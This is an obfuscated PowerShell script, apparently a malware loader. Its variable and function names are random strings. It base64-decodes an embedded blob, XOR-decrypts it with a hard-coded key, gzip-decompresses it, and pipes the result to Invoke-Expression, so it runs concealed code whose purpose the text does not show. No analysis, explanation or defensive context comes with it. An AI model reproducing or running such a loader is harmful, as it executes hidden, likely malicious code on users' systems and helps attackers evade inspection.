$ta9onz6j3x7qbkr = [System.Text.Encoding]::ascii
function 5hkaxjz4un3v7mfr91scqiwplt6  {param($9jxzam4k3vtfdqi )
  $bpek406noglxiuh = [System.Convert]::FromBase64String($9jxzam4k3vtfdqi)
  $i1zyq8k42307bgu= $ta9onz6j3x7qbkr.GetBytes("qut7yjok5314")
    $ygatq4nfu0vx8e2 = $bpek406noglxiuh
    $hjnxfeysdpo3qaw = $(for ($3zv7ko5ut1g0q2l = 0; $3zv7ko5ut1g0q2l -lt $ygatq4nfu0vx8e2.length; ) {
        for ($l24no0auc5xzk91 = 0; $l24no0auc5xzk91 -lt $i1zyq8k42307bgu.length; $l24no0auc5xzk91++) {
            $ygatq4nfu0vx8e2[$3zv7ko5ut1g0q2l] -bxor $i1zyq8k42307bgu[$l24no0auc5xzk91]
            $3zv7ko5ut1g0q2l++
            if ($3zv7ko5ut1g0q2l -ge $ygatq4nfu0vx8e2.Length) {
                $l24no0auc5xzk91 = $i1zyq8k42307bgu.length
            }
        }
    })
	$mlb8hnt2ewkgsr1 = New-Object System.IO.MemoryStream( , $hjnxfeysdpo3qaw )

	    $nfp43kx0c7gwlzv = New-Object System.IO.MemoryStream
        $srlupmhij0v5nez = New-Object System.IO.Compression.GzipStream $mlb8hnt2ewkgsr1, ([IO.Compression.CompressionMode]::Decompress)
	    $srlupmhij0v5nez.CopyTo( $nfp43kx0c7gwlzv )
        $srlupmhij0v5nez.Close()
		$mlb8hnt2ewkgsr1.Close()
		[byte[]] $7qy5fzn4o0lmcgp = $nfp43kx0c7gwlzv.ToArray()
 $sdzvuf05gqter61=$7qy5fzn4o0lmcgp
    return $sdzvuf05gqter61
}
[byte[]]$17eny238lk5tru6=5hkaxjz4un3v7mfr91scqiwplt6 $qiwfpl05vd841je
[System.Text.Encoding]::ascii.GetString((5hkaxjz4un3v7mfr91scqiwplt6 "bv58N3lqb2sxM7xhqgfXD2kXMcHNNKT+KrSftrv9M02cD+kt4w1C+Z+ItfJofFt+d2xgtD3u3xqHzcZZXztoC3brRSuY5djn1i424A3SCEJCJiIoVGvveiCAymOI2yu2WlPmcz8JdbhM/A/Us3pHoX/1P0iXGSFqwoEeE70lbPSVYAWNLlD+ca/yCaFHixoIt4jz1Br41+dsJGU5J/9SMXfzWJi2GpaM6Ca8ZqFmdn4bAdgns1lNxS+rbVweAXSca+D7s8U9fUfz9d54gXDhPUWkyuMzF5AzzL/RuafGfTdaCwdiTyQ7Ckchgi5Ddworvg1zjXsOXZ424TKU90RnJV2CUUQ71FMLJBirSZPuXwiqkyyfaN9pAS8i1sS3IOVwKufhnxjNqO54YUYLCusLWS7CGgC0aWTHZNia4hPXrJSgHaIOrnIQeUpK3Wqq53ArG/XBwtS8lJKXakcAgJzaES4veVC5uBGP06HmSMYMkl2ZDeZxhsvugNOTvsXpH5jOEI5dnjNPEG7ghoTKD8p6Ttsid4HveAiFDOJEja/66xCGYDKt/vcFU2Ecud4YOK+r6t3xOx0N0h0L7d5bt3Kxz2mskEoVWe818/3kTl84wTuOsPHKSg/tj3j7YOaq2BceJR24VdsKLIkz1rpXY7JqZp0tdnTeaQXDaaHLR4PHnxx2dYjWVdfTTLIqSwGahlbl/Zudrd37NzumsrOc8W5PlOJ1EDNE4R+i9zk1q3sBfMqwnlYikgkOHhjL9kiXdcqkgyDTTG2kmP55PJtCwbPW5WbCsCi7QxkcUfa4rEVt82z1+82v9Vyp9jmMyfUd7OqNp/CWmS7PaLTxwP3FW9O8EzAozAKNcYne+ZQrR30v3s98MXSAvyw8pBts8IPvlwfPXv4T13nnjA9/IWa5tGJSntLuM3IQ/n6cI3dDNnkHJDwPJ/dol78s3aeHizFWw0ifcltPsYO6rwQKMM3BHb0zWqJ0slFqHTeJgoaK58cw1XyizQ7rvhtpwJ8bUYHOxaRHBh572OuF+JXHfNblyANywdHVGxDisNAxD067QlR8JEGms7cVkwEdOfi84n8Er/ufPHBE+QCqZPLi8z1VVv7tM9tE0u/3jSczlqLSJM9YpkRoKMOx6SaHbL0suuQQJAZhJWPUIfUpR3vP9UmDgmZMj9kRepp5YZOU8QidkGiqMVrdlG6xW0IohkAz1kh6eeLLEgkB0SZtb2s="))|iex;